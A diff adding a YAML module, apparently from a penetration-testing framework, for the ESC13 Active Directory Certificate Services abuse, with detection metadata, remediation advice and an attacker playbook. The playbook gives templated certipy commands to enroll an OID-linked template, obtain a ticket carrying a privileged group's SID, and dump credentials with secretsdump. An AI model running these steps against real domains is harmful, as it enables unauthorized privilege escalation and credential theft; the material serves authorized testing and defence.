@@ -1,0 +1,67 @@
+# ESC13 — ADCS OID group link → cert grants group membership
+#
+# An issuance-policy OID on a certificate template is linked to
+# a security group via `msDS-OIDToGroupLink`. Any user who
+# enrolls a cert with that policy OID + logs in with the cert
+# gets the linked group's SID injected into their PAC — even
+# though they're not a member of the group in AD. If the linked
+# group has DA / DCSync / high-value rights, the enrolled user
+# effectively becomes a member for the session's lifetime.
+#
+# Newer AD-CS abuse path (SpecterOps 2023). Detection: certipy
+# 4.7+ flags "ESC13".
+# Fix: remove the msDS-OIDToGroupLink attribute from any policy
+# OID that maps to a privileged group; restrict template
+# enrollment ACLs to trusted principals only.
+technique: T1649
+name: ESC13 — ADCS OID→group link cert grants group membership
+tactic: [privilege-escalation, credential-access]
+platform: [windows]
+key: 'adcs:esc13'
+family: adcs
+ranking:
+  exploitability: high
+  safety: read-only              # enroll + auth; no template modification
+  detection: quiet
+detect:
+  version_range:
+    services.adcs: ">=1.0"
+execute:
+  command: |-
+    certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc> 2>&1 | grep -A 5 ESC13 || echo "no ADCS OID group link flagged ESC13 — see playbook"
+verify:
+  success: "ESC13"
+cleanup:
+  command: ""
+report:
+  vector_type: cert_template_esc13
+  evidence: "template {{template}} issues cert with OID linked to group {{group}}"
+  description: >
+    An ADCS template's issuance-policy OID is linked to a
+    security group via msDS-OIDToGroupLink. A low-priv user
+    who enrolls the template + authenticates with the cert
+    has the linked group's SID injected into their PAC —
+    effective group membership for the session. If the linked
+    group is DA / has DCSync / has high-value ACLs, the
+    enrolled user gains those rights without ever being
+    added to the group.
+  remediation: >
+    Remove msDS-OIDToGroupLink from any policy OID linked to
+    a privileged group; the attribute exists for legitimate
+    smart-card-only scenarios but is dangerous when linked
+    to admin-level groups. Audit template enrollment ACLs
+    for the flagged templates; restrict to trusted enrollees.
+    Revoke any certs enrolled by non-baseline principals.
+  refs: [T1649, ESC13, certipy]
+playbook:
+  summary: >
+    Enroll OID-linked template → auth → PAC carries linked
+    group's SID → effective admin.
+  place: 'attacker-side (certipy 4.7+; requires the OID-mapping SpecterOps blog trigger for context)'
+  steps:
+    - "confirm: `certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc>` — look for ESC13 + the linked group's name"
+    - "enroll the template: `certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA>' -template '<template>'` — writes user.pfx"
+    - "auth: `certipy auth -pfx user.pfx -dc-ip <dc>` — TGT with the linked group's SID in the PAC"
+    - "prove: use the TGT — pass-the-ticket for a task requiring the linked group's rights (e.g. impacket-secretsdump if the group has DCSync)"
+    - "CLEANUP: revoke the enrolled cert. The group SID in the PAC is session-scoped; a new TGT without the enrolled cert won't carry it."
+  restore: "certipy ca -revoke <serial> -u '<user>@<domain>' -p '<pass>' -ca '<CA>'"
